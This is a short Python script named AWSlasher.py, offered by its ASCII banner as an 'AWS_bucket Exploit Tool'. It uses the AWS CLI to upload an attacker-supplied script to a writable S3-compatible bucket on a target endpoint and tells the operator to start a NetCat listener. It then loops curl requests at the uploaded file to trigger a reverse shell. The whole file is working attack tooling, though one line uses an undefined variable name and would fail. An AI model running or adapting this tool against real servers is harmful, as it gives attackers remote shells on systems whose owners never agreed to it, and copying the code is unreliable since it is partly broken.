import os
import sys
import re
import subprocess

banner = """
                        (
       (      (  (      )\ )                   )
       )\     )\))(   '(()/( (       )      ( /(    (   (
    ((((_)(  ((_)()\ )  /(_)))(   ( /(  (   )\())  ))\  )(
     )\ _ )\ _(())\_)()(_)) (()\  )(_)) )\ ((_)\  /((_)(()
     (_)_\(_)\ \((_)/ // __| ((_)((_)_ ((_)| |(_)(_))   ((_)
      / _ \   \ \/\/ / \__ \| '_|/ _` |(_-<| ' \ / -_) | '_|
     /_/ \_\   \_/\_/  |___/|_|  \__,_|/__/|_||_|\___| |_|

    [AWS_bucket Exploit Tool.]
    [+]Upload to file for reverse_shell

"""

usage = """
    usage: AWSlasher.py <target_url> <path_of_script> <directory> <script_name>

    """

if len(sys.argv) < 5:
    print(usage)
    sys.exit()

print(banner)

target_url = sys.argv[1]
path_of_script = sys.argv[2]
directory = sys.argv[3]
script_name = sys.argv[4]

reg = re.search(r"^http.+/$",target_url)

if reg == None:
    target_url = target_url + "/"

reg = re.search(r".+/$",directory)

if reg == None:
    directory = directory + "/"


print("[+]Generated the Payload: ")


payload = f"aws --endpoint-url {target_url} s3 cp {path_of_script} s3://{directory}{script_name}"

print("+"+"-"*len(payload)+"+")

print(f"|{payload}|")

print("+"+"-"*len(payload)+"+")

try:

    os.system(payload)
    print("[+]Done")
    
    os.system(f"aws --endpoint-url {target_url} s3 ls s3://{directory}")

except:

    print("[!]Payload upload failed...")
    print(usage)
    sys.exit()

attention = """
+----------------------------------+
|[*]Execute Uploaded File in Target|
+----------------------------------+
+----------------------------------+
|[+]Please Run NetCat listener!!!!!|
+----------------------------------+
+----------------------------------+
|[+]Kill me with Ctrl+C on success |
+----------------------------------+
"""

print(attention)
target_url=targeturl.replace("s3.","")
payload2 = f"curl {target_url}{script_name} &> /dev/null"

print(payload2)

while True:
    res = subprocess.getoutput(payload2)


